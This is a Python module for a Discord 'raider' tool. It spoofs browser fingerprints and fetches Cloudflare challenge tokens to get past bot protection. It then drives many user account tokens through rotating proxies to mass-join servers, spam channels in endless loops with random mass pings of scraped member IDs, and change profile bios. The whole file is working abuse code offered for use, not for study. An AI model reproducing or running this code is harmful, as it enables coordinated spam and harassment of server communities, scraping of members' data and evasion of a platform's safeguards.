import base64
import json
import os
import random
import re
import secrets
import time
import uuid
import requests
import websocket
import threading
from .files import Files
from .console import Render
from .config import C, PROXY_ENABLED
from .scraper import scrape_members
from .utils import get_random_str



console = Render()


class Raider:
    def __init__(self, tls_session):
        self.session = tls_session
        self.build_number = "429117"  # fallback
        self.cf_token = self._get_cf_token()
        self.cookies, self.fingerprint = self._get_discord_cookies_and_fp()

    def _get_cf_token(self):
        try:
            r = requests.get("https://discord.com/channels/@me", timeout=10)
            challenge = re.sub(r".*r:'([^']+)'.*", r"\1", r.text, flags=re.DOTALL)
            bn = re.sub(r'.*"BUILD_NUMBER":"(\d+)".*', r'\1', r.text, flags=re.DOTALL)
            if bn.isdigit():
                self.build_number = bn

            url = f"https://discord.com/cdn-cgi/challenge-platform/h/b/jsd/r/{random.random():.16f}:{int(time.time())}:{secrets.token_urlsafe(32)}/{challenge}"
            resp = requests.post(url, timeout=12)
            if resp.status_code == 200:
                cookie = list(resp.cookies)[0]
                return f"{cookie.name}={cookie.value}"
        except Exception as e:
            console.log("ERROR", C["red"], "Cloudflare token fetch failed", str(e))
        return ""

    def _get_discord_cookies_and_fp(self):
        try:
            r = self.session.get("https://discord.com/api/v9/experiments")
            if r.status_code == 200:
                cookies = "; ".join(f"{c.name}={c.value}" for c in r.cookies)
                return f"{cookies}; {self.cf_token}; locale=en-US", r.json().get("fingerprint")
        except:
            pass
        console.log("ERROR", C["red"], "Using fallback fingerprint & cookies")
        return (
            "__dcfduid=62f9e16000a211ef8089eda5bffbf7f9; __sdcfduid=...; locale=en-US",
            "fallback-fingerprint-placeholder"
        )

    def super_properties(self):
        payload = {
            "os": "Windows",
            "browser": "Chrome",
            "release_channel": "stable",
            "os_version": "10",
            "system_locale": "pl",
            "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...",
            "browser_version": "139.0.0.0",
            "client_build_number": int(self.build_number),
            "client_launch_id": str(uuid.uuid4()),
            "client_heartbeat_session_id": str(uuid.uuid4()),
            "launch_signature": str(uuid.uuid4()),
            "client_event_source": None,
        }
        return base64.b64encode(json.dumps(payload).encode()).decode()

    def headers(self, token: str) -> dict:
        return {
            "authority": "discord.com",
            "accept": "*/*",
            "accept-language": "en",
            "authorization": token,
            "cookie": self.cookies,
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...",
            "x-discord-locale": "en-US",
            "x-debug-options": "bugReporterEnabled",
            "x-fingerprint": self.fingerprint,
            "x-super-properties": self.super_properties(),
        }

    def nonce(self) -> int:
        return (int(time.time() * 1000) - 1420070400000) << 22

    # ──────────────────────────────────────────────
    #               All raiding methods below
    # ──────────────────────────────────────────────

    def join_server(self, invite: str, tokens: list[str]):
        invite = re.sub(r"(https?://)?(www\.)?(discord\.(gg|com)/(invite/)?|\.gg/)", "", invite.strip())

        # Get invite info with first valid token
        invite_data = None
        for token in tokens:
            try:
                r = self.session.get(
                    f"https://discord.com/api/v9/invites/{invite}",
                    headers=self.headers(token),
                    params={"with_counts": "true", "with_expiration": "true", "with_permissions": "true"}
                )
                if r.status_code == 200:
                    invite_data = r.json()
                    break
            except:
                continue

        if not invite_data:
            console.log("Failed", C["red"], "Invalid or expired invite")
            return

        guild_name = invite_data["guild"]["name"]
        guild_id = invite_data["guild"]["id"]
        channel_id = invite_data["channel"]["id"]
        channel_type = invite_data["channel"]["type"]

        context = base64.b64encode(json.dumps({
            "location": "Join Guild",
            "location_guild_id": guild_id,
            "location_channel_id": channel_id,
            "location_channel_type": channel_type
        }).encode()).decode()

        def _join_one(tk: str):
            try:
                h = self.headers(tk)
                h["X-Context-Properties"] = context
                r = self.session.post(
                    f"https://discord.com/api/v9/invites/{invite}",
                    headers=h,
                    json={"session_id": uuid.uuid4().hex}
                )
                if r.status_code == 200:
                    console.log("Joined", C["green"], f"{tk[:25]}...", guild_name)
                elif r.status_code == 400:
                    console.log("Captcha", C["yellow"], f"{tk[:25]}...")
                elif r.status_code == 429:
                    console.log("Cloudflare", C["magenta"], f"{tk[:25]}...")
                else:
                    console.log("Failed", C["red"], f"{tk[:25]}...", r.text)
            except Exception as e:
                console.log("Failed", C["red"], f"{tk[:25]}...", str(e))

        self._run_threads(_join_one, [(t,) for t in tokens])

    def leave_server(self, guild_id: str, tokens: list[str]):
        def _leave_one(tk: str):
            try:
                r = self.session.delete(
                    f"https://discord.com/api/v9/users/@me/guilds/{guild_id}",
                    headers=self.headers(tk),
                    json={"lurking": False}
                )
                if r.status_code in (204, 200):
                    console.log("Left", C["green"], f"{tk[:25]}...")
                else:
                    console.log("Failed", C["red"], f"{tk[:25]}...", r.text)
            except Exception as e:
                console.log("Failed", C["red"], f"{tk[:25]}...", str(e))

        self._run_threads(_leave_one, [(t,) for t in tokens])

    def spam_channel(self, channel_id: str, message: str, guild_id: str = None,
                     massping: bool = False, ping_count: int = 0, random_tail: bool = False,
                     delay: float = 1.5, tokens: list = None):

        if massping and guild_id:
            console.log("Info", C["yellow"], False, "Scraping members for mass ping...")
            self.scrape_members_if_needed(guild_id, channel_id, tokens)

        def _spam_one(tk: str):
            while True:
                try:
                    content = message
                    if random_tail:
                        content += f"  {get_random_str(12)}"
                    if massping and guild_id:
                        pings = self._get_random_pings(guild_id, ping_count)
                        content += " " + pings

                    r = self.session.post(
                        f"https://discord.com/api/v9/channels/{channel_id}/messages",
                        headers=self.headers(tk),
                        json={"content": content}
                    )
                    if r.status_code == 200:
                        console.log("Sent", C["green"], f"{tk[:25]}...")
                    elif r.status_code == 429:
                        retry = r.json().get("retry_after", 5) + random.uniform(0.3, 1.2)
                        console.log("Ratelimit", C["yellow"], f"{tk[:25]}...", f"wait {retry:.1f}s")
                        time.sleep(retry)
                    else:
                        console.log("Failed", C["red"], f"{tk[:25]}...", r.text)
                        break
                    time.sleep(delay + random.uniform(-0.4, 0.6))
                except Exception as e:
                    console.log("Error", C["red"], f"{tk[:25]}...", str(e))
                    time.sleep(4)

        self._run_threads(_spam_one, [(t,) for t in tokens])

    def _get_random_pings(self, guild_id: str, count: int) -> str:
        path = f"scraped/{guild_id}.json"
        if not os.path.exists(path):
            return ""
        try:
            with open(path, encoding="utf-8") as f:
                members = json.load(f)
            if not members:
                return ""
            return "".join(f"<@!{random.choice(members)}>" for _ in range(count))
        except:
            return ""

    def scrape_members_if_needed(self, guild_id: str, channel_id: str, tokens: list):
        path = f"scraped/{guild_id}.json"
        if os.path.exists(path):
            return

        valid_token = None
        for tk in tokens:
            r = self.session.get(f"https://discord.com/api/v9/guilds/{guild_id}", headers=self.headers(tk))
            if r.status_code == 200:
                valid_token = tk
                break

        if not valid_token:
            console.log("Failed", C["red"], "No token has access to guild")
            return

        members = scrape_members(valid_token, guild_id, channel_id)
        if members:
            with open(path, "w", encoding="utf-8") as f:
                json.dump(list(members.keys()), f, indent=2)
            console.log("Success", C["green"], False, f"Saved {len(members)} member IDs")

    def change_bio(self, bio: str, tokens: list):
        def _change(tk):
            try:
                r = self.session.patch(
                    "https://discord.com/api/v9/users/@me/profile",
                    headers=self.headers(tk),
                    json={"bio": bio}
                )
                if r.status_code == 200:
                    console.log("Bio changed", C["green"], f"{tk[:25]}...")
                else:
                    console.log("Failed", C["red"], f"{tk[:25]}...", r.text)
            except Exception as e:
                console.log("Error", C["red"], f"{tk[:25]}...", str(e))

        self._run_threads(_change, [(t,) for t in tokens])

    # Add other methods similarly: format_tokens, dm_spammer, call_spammer, thread_spammer, etc.

    def format_tokens(self, tokens: list):
        cleaned = []
        for line in tokens:
            line = line.strip()
            if not line:
                continue
            parts = line.split(":")
            cleaned.append(parts[-1] if len(parts) >= 3 else line)

        console.log("Success", C["green"], False, f"Formatted {len(cleaned)} tokens")
        Files.save_tokens(cleaned)

    def _run_threads(self, target, args_list: list[tuple]):
        threads = []
        for args in args_list:
            if PROXY_ENABLED and hasattr(self.session, "proxies_list") and self.session.proxies_list:
                proxy = random.choice(self.session.proxies_list)
                self.session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            else:
                self.session.proxies = {}

            t = threading.Thread(target=target, args=args, daemon=True)
            threads.append(t)
            t.start()

        for t in threads:

            t.join()
